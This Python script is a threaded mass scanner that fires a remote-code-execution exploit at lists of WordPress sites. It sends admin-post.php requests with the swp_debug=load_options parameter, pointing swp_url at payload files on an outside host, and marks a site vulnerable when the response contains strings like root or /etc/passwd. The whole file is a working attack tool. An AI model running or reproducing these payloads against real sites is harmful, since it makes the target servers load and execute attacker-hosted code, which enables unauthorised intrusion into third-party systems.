import requests
from rich.console import Console
from rich.progress import track
from concurrent.futures import ThreadPoolExecutor
import re
import argparse
from pathlib import Path
from urllib.parse import urlparse

console = Console()

# Define payloads to test
payloads = [
    "/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.txt",
    "/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.php",
    "/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.html",
]

# Sensitive keywords to check for in the response
sensitive_keywords = ["root", "sudo", "/etc/passwd", "bash", "wget", "admin"]

# Function to print the logo
def print_logo():
    logo = """
██████╗ ██████╗ ███████╗██████╗ ██████╗ ███████╗███████╗    ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║  ██║██║  ██║█████╗  ██████╔╝██████╔╝█████╗  █████╗      ██║  ██║██║     █████╗
██║  ██║██║  ██║██╔══╝  ██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══╝      ██║  ██║██║     ██╔══╝
██████╔╝██████╔╝███████╗██║     ██║     ███████╗███████╗    ██████╔╝╚██████╗███████╗
╚═════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝     ╚══════╝╚══════╝    ╚═════╝  ╚═════╝╚══════╝
"""
    console.print(f"[bold blue]{logo}[/bold blue]")
    console.print("[bold green]WordPress RCE Vulnerability Scanner[/bold green]\n")

# Function to ensure the domain includes "https://"
def ensure_https(domain: str) -> str:
    # Check if the domain already includes "http://" or "https://"
    parsed_url = urlparse(domain)
    if not parsed_url.scheme:
        # Add "https://" if the domain doesn't have a scheme
        domain = f"https://{domain}"
    return domain

# Function to check a single domain
def check_domain(domain):
    results = []
    for payload in payloads:
        url = f"{domain.rstrip('/')}{payload}"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                # Check if sensitive keywords are in the response text
                if any(keyword in response.text.lower() for keyword in sensitive_keywords):
                    results.append((url, True))
                else:
                    results.append((url, False))
            else:
                results.append((url, False))
        except requests.RequestException:
            results.append((url, None))  # None for failed attempts
    return results

# Function to process a domain
def process_domain(domain):
    domain = ensure_https(domain)  # Ensure the domain is prefixed with "https://"
    results = check_domain(domain)
    domain_results = []
    for url, vulnerable in results:
        if vulnerable is True:
            domain_results.append(f"[bold green]VULNERABLE![/bold green] {url}")
        elif vulnerable is False:
            domain_results.append(f"[yellow]NOT VULNERABLE[/yellow]: {url}")
        else:
            domain_results.append(f"[red]FAILED[/red]: {url}")
    return domain_results

# Main function
def main():
    parser = argparse.ArgumentParser(
        description="WordPress RCE Vulnerability Scanner",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-u", "--url", type=str, help="Single domain to scan")
    parser.add_argument("-l", "--list", type=Path, help="File containing a list of domains")
    parser.add_argument("-o", "--output", type=Path, help="File to save the results")

    args = parser.parse_args()

    print_logo()

    if not args.url and not args.list:
        console.print("[red]You must provide either a single URL (-u) or a list of domains (-l).[/red]")
        return

    output_file = None
    if args.output:
        output_file = args.output.open("w")

    domains = []
    if args.url:
        domains.append(args.url)
    if args.list:
        try:
            with args.list.open("r") as f:
                domains.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            console.print(f"[red]File not found: {args.list}[/red]")
            return

    # Use rich's status to keep "Scanning..." at the bottom while showing results
    with console.status("[bold green]Scanning...[/bold green]", spinner="dots") as status:
        with ThreadPoolExecutor(max_workers=10) as executor:
            for domain_results in track(executor.map(process_domain, domains), description="Scanning..."):
                # Print results as we scan
                for result in domain_results:
                    console.print(result)

    # Save the results to the output file, if provided
    if output_file:
        output_file.write("\n".join(result for result in domain_results))
        output_file.close()
        console.print(f"[bold green]Results saved to {args.output}[/bold green]")

if __name__ == "__main__":
    main()
